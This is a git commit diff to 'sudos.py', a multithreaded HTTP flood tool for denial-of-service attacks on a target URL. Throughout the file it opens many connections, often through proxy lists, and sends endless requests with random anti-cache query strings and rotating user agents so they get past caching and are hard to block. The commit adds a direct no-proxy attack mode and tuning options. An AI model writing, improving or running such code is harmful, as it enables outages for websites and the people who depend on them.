340c2c7f1297d21a4a5d9b51ce452dcf8eb96f13
lilmond <54730301+lilmond@users.noreply.github.com>
2021-06-29 05:49:56 +0000

    Update sudos.py

--- sudos.py
+++ sudos.py
@@ -1,6 +1,5 @@
-#!/usr/bin/env python3
-#Beta Version: 2.1
-from random_user_agent.user_agent import UserAgent
+#!/usr/bin/env python
+#version: beta-2.2
 import threading
 import argparse
 import logging
@@ -19,24 +18,27 @@ parser.add_argument("proxy_list", nargs="?", type=str, help="Proxy list file. Cl
 parser.add_argument("proxy_type", nargs="?", type=str, help="Proxy list type. Proxy Types: SOCKS5, SOCKS4, HTTP")
 parser.add_argument("-p", "--port", type=int, default=80, help="URL host's port. Sets to 443 when using HTTPS protocol")
 parser.add_argument("-m", "--method", type=str, default="GET", help="HTTP request method. Default: GET")
-parser.add_argument("-t", "--threads", type=int, default=777, help="Max threads. Default: 777")
+parser.add_argument("-t", "--threads", type=int, default=100, help="Max threads. Default: 100")
 parser.add_argument("-d", "--debug", action="store_true", help="Enables debug mode")
-parser.add_argument("--timeout", type=int, default=None, help="Set default socket connection timeout")
+parser.add_argument("--delay", type=int, default=5, help="Delay seconds to send HTTP requests. Default: 5")
+parser.add_argument("--timeout", type=int, default=5, help="Set default socket connection timeout. Default: 5")
 parser.add_argument("--rpp", type=int, default=777, help="Set requests per proxy. Default: 777")
 
 parser.set_defaults(debug=False)
 
 args = parser.parse_args()
 
+use_proxy = True
+
 if not args.url:
     parser.print_help()
     print("URL is required. Example: https://example.com/path/")
     sys.exit()
-elif not args.proxy_list:
-    parser.print_help()
-    print("Proxy list file is required. Example: ./socks5_list.txt")
-    sys.exit()
-elif not args.proxy_type:
+    
+if not args.proxy_list:
+    use_proxy = False
+    
+if not args.proxy_type and use_proxy:
     parser.print_help()
     print("Proxy type is required. Example: SOCKS5, SOCKS4, HTTP")
     sys.exit()
@@ -61,6 +63,7 @@ max_threads = args.threads
 debug = args.debug
 timeout = args.timeout
 rpp = args.rpp
+delay = args.delay
 
 if debug:
     logging.basicConfig(
@@ -114,31 +117,37 @@ if not protocol in protocol_list:
 if protocol == "HTTPS":
     port = 443
 path = f"/{path}"
-proxy_type = proxy_type.upper()
+if use_proxy:
+    proxy_type = proxy_type.upper()
 parameters_str = parameters
 if parameters != "":
     parameters = f"&{parameters}"
 
-try:
-    proxy_file = open(proxy_list, "r")
-    proxies = proxy_file.readlines()
-    proxy_file.close()
-except FileNotFoundError:
-    print(f"Proxy list file not found!")
-    sys.exit()
-except Exception as e:
-    print(f"Cannot open proxy list file: {e}")
-    sys.exit()
+if use_proxy:
+    try:
+        proxy_file = open(proxy_list, "r")
+        proxies = proxy_file.readlines()
+        proxy_file.close()
+    except FileNotFoundError:
+        print(f"Proxy list file not found!")
+        sys.exit()
+    except Exception as e:
+        print(f"Cannot open proxy list file: {e}")
+        sys.exit()
 
-try:
-    proxy_type_str = proxy_type
-    proxy_type = getattr(socks, proxy_type)
-except AttributeError:
-    print(f"{proxy_type} is not a valid proxy type! Proxy Types: SOCKS5, SOCKS4, HTTP")
-    sys.exit()
-except Exception as e:
-    print(f"Proxy Type Error: {e}")
-    sys.exit()
+    proxy_types = ["SOCKS4", "SOCKS5", "HTTP"]
+
+    try:
+        proxy_type_str = proxy_type
+        if not proxy_type in proxy_types:
+            raise AttributeError
+        proxy_type = getattr(socks, proxy_type)
+    except AttributeError:
+        print(f"{proxy_type} is not a valid proxy type! Proxy Types: SOCKS5, SOCKS4, HTTP")
+        sys.exit()
+    except Exception as e:
+        print(f"Proxy Type Error: {e}")
+        sys.exit()
 
 if timeout != None:
     try:
@@ -158,7 +167,8 @@ if url == url_ip:
 else:
     url_ip = f"Domain IP: {url_ip}\r\n"
 
-proxies_length = len(proxies)
+if use_proxy:
+    proxies_length = len(proxies)
 
 #You can uncomment this if you want.
 #print(f"[---] Attack Information [---]\r\nProtocol: {protocol}\r\nURL: {url}\r\n{url_ip}Port: {port}\r\nPath: {path}\r\nParameters: {parameters_str}\r\nMethod: {method}\r\nProxy List: {proxy_list}\r\nProxy Type: {proxy_type_str}\r\nProxies: {proxies_length}\r\nTimeout: {timeout}\r\nMax Thread: {max_threads}\r\nDebug: {debug}\r\n")
@@ -176,7 +186,6 @@ elif sys.platform == "win32":
 logger.info("Initializing components...")
 
 active_threads = 0
-usera = UserAgent()
 chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
 chars_list = list(chars)
 hrs = 0
@@ -186,9 +195,23 @@ total_Bps = 0
 total_socks_used = 0
 initial_attack_time = 0
 
+user_agents = [
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0",
+    "AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
+    "msnbot-131-253-46-102.search.msn.com",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
+    "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) ",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/534.34 (KHTML,like Gecko) PhantomJS/1.9.0 (development) Safari/534.34",
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
+]
+
 logger.info("Done!")
 
-def HTTPS(host, port, proxy_host, proxy_port):
+def HTTPS(host, port, proxy_host=None, proxy_port=None):
     try:
         global active_threads
         global hrs
@@ -200,7 +223,10 @@ def HTTPS(host, port, proxy_host, proxy_port):
         port = int(port)
         proxy_port = int(port)
         rp = int(rpp)
-        sock = socks.socksocket()
+        if use_proxy:
+            sock = socks.socksocket()
+        else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(timeout)
         sock.connect((host, port))
         total_socks_used += 1
@@ -209,20 +235,21 @@ def HTTPS(host, port, proxy_host, proxy_port):
         for _ in range(rp):
             anti_cache_list = random.choices(chars_list, k=77)
             anti_cache = "".join(anti_cache_list)
-            user_agent = usera.get_random_user_agent()
-            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
+            user_agent = random.choices(user_agents)
+            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nConnection: close\r\n\r\n"
             sent_bytes = sock.send(http.encode())
             Bps += sent_bytes
             hrs += 1
             total_hrs += 1
             total_Bps += sent_bytes
+            time.sleep(delay)
     except Exception as e:
         logger.debug(f"HTTPS Error: {e}")
         pass
     finally:
         active_threads -= 1
 
-def HTTP(host, port, proxy_host, proxy_port):
+def HTTP(host, port, proxy_host=None, proxy_port=None):
     try:
         global active_threads
         global hrs
@@ -232,21 +259,26 @@ def HTTP(host, port, proxy_host, proxy_port):
         global total_socks_used
         active_threads += 1
         port = int(port)
-        proxy_port = int(proxy_port)
+        if use_proxy:
+            proxy_port = int(proxy_port)
         rp = int(rpp)
-        sock = socks.socksocket()
+        if use_proxy:
+            sock = socks.socksocket()
+        else:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect((host, port))
         total_socks_used += 1
-        while True:
+        for _ in range(rp):
             anti_cache_list = random.choices(chars_list, k=77)
             anti_cache = "".join(anti_cache_list)
-            user_agent = usera.get_random_user_agent()
-            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
+            user_agent = random.choices(user_agents)
+            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\nConnection: close\r\n\r\n"
             sent_bytes = sock.send(http.encode())
             Bps += sent_bytes
             hrs += 1
             total_hrs += 1
             total_Bps += sent_bytes
+            time.sleep(delay)
     except Exception as e:
         logger.debug(f"HTTP Error: {e}")
         pass
@@ -273,15 +305,21 @@ def main():
         initial_attack_time = time.time()
         logger.info("Initializing attack...\r\n")        
         threading.Thread(target=verbose_status, daemon=True).start()
-        while True:
-            for proxy in proxies:
-                proxy = proxy.strip()
-                proxy_host, proxy_port = proxy.split(":")
-                while True:
-                    if active_threads >= max_threads:
-                        continue
-                    threading.Thread(target=eval(protocol), args=[url, port, proxy_host, proxy_port], daemon=True).start()
-                    break
+        if use_proxy:
+            while True:
+                for proxy in proxies:
+                    proxy = proxy.strip()
+                    proxy_host, proxy_port = proxy.split(":")
+                    while True:
+                        if active_threads >= max_threads:
+                            continue
+                        threading.Thread(target=eval(protocol), args=[url, port, proxy_host, proxy_port], daemon=True).start()
+                        break
+        else:
+            while True:
+                if active_threads >= max_threads:
+                    continue
+                threading.Thread(target=eval(protocol), args=[url, port]).start()
     except Exception as e:
         print(f"Main Error: {e}")
         sys.exit()
